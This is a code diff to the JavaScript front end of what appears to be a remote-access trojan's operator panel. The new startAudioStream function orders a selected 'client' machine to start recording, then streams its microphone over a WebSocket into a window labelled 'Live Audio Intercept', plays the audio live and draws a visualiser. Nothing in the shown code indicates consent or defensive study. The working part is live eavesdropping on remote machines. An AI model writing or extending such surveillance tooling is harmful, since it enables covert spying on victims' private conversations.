@@ -1563,36 +1563,79 @@ function createDragWindow(id, title, icon, extraHtml = '') {
 let audioCtx = null;
 let audioDrawVisual = null;
 function startAudioStream() {
-    cmd('audio_start');
-    const win = createDragWindow('audio-win', 'Live Audio Stream (Beta)', 'fa-solid fa-microphone', 
-        '<canvas id="audio-canvas" width="570" height="300" style="width:100%; height:100%; object-fit: cover;"></canvas>');
+    if(!selectedClient) return;
+    execute(selectedClient, 'audio_start');
+
+    const win = createDragWindow('audio-win', 'Live Audio Intercept (PCM-Pro)', 'fa-solid fa-microphone', 
+        '<div style="display:flex; flex-direction:column; height:100%;"><div style="flex:1; position:relative;"><canvas id="audio-canvas" width="570" height="200" style="width:100%; height:100%; object-fit: cover;"></canvas></div><div id="audio-status" style="padding:10px; font-size:0.8rem; color:var(--accent); text-align:center; background:rgba(0,0,0,0.3);">BUFFERING...</div></div>');
     
-    if(!audioCtx) {
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    } else if (audioCtx.state === 'suspended') {
-        audioCtx.resume();
-    }
-    
+    let ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+    let nextPlayTime = 0;
+    const statusEl = document.getElementById('audio-status');
     const canvas = document.getElementById('audio-canvas');
     const canvasCtx = canvas.getContext('2d');
     
-    // Draw empty visualizer loop
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const audioWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${selectedClient}`);
+    audioWs.binaryType = 'arraybuffer';
+
+    audioWs.onopen = () => { statusEl.textContent = 'LISTENING LIVE'; statusEl.style.color = 'var(--success)'; };
+    audioWs.onclose = () => { statusEl.textContent = 'OFFLINE'; statusEl.style.color = 'var(--danger)'; };
+
+    let analyzer = ctx.createAnalyser();
+    analyzer.fftSize = 256;
+    let dataArray = new Uint8Array(analyzer.frequencyBinCount);
+
+    audioWs.onmessage = (msg) => {
+        const buffer = msg.data;
+        const view = new DataView(buffer);
+        if (view.getUint8(0) !== 0x03) return;
+
+        // Skip type byte
+        const pcm = new Int16Array(buffer, 1);
+        const floatData = new Float32Array(pcm.length);
+        for (let i = 0; i < pcm.length; i++) floatData[i] = pcm[i] / 32768;
+
+        const audioBuf = ctx.createBuffer(1, floatData.length, 16000);
+        audioBuf.getChannelData(0).set(floatData);
+
+        const source = ctx.createBufferSource();
+        source.buffer = audioBuf;
+        source.connect(analyzer);
+        analyzer.connect(ctx.destination);
+
+        if (nextPlayTime < ctx.currentTime) nextPlayTime = ctx.currentTime + 0.05;
+        source.start(nextPlayTime);
+        nextPlayTime += audioBuf.duration;
+    };
+
     function draw() {
-        if(!document.getElementById('audio-canvas')) return; // Window closed
-        audioDrawVisual = requestAnimationFrame(draw);
-        canvasCtx.fillStyle = 'rgba(15, 15, 20, 0.2)';
+        if(!document.getElementById('audio-canvas')) return;
+        requestAnimationFrame(draw);
+        analyzer.getByteFrequencyData(dataArray);
+
+        canvasCtx.fillStyle = '#0a0a0f';
         canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
-        canvasCtx.lineWidth = 2;
-        canvasCtx.strokeStyle = 'var(--accentPrimary)';
-        canvasCtx.beginPath();
-        // Just draw a flat line until we implement full analyzer feed, the UI must look aesthetic
-        canvasCtx.moveTo(0, canvas.height/2 + (Math.random()*10 - 5));
-        for(let i=0; i<canvas.width; i+=10) {
-            canvasCtx.lineTo(i, canvas.height/2 + (Math.random()*20 - 10));
+
+        const barWidth = (canvas.width / analyzer.frequencyBinCount) * 2.5;
+        let x = 0;
+        for (let i = 0; i < analyzer.frequencyBinCount; i++) {
+            const barHeight = dataArray[i] / 2;
+            const grad = canvasCtx.createLinearGradient(0, canvas.height, 0, 0);
+            grad.addColorStop(0, 'var(--accent)');
+            grad.addColorStop(1, '#fff');
+            canvasCtx.fillStyle = grad;
+            canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
+            x += barWidth + 1;
         }
-        canvasCtx.stroke();
     }
-    if(!audioDrawVisual) draw();
+    draw();
+
+    win.onClose = () => {
+        execute(selectedClient, 'audio_stop');
+        audioWs.close();
+        ctx.close();
+    };
 }
 
 function startStream() {
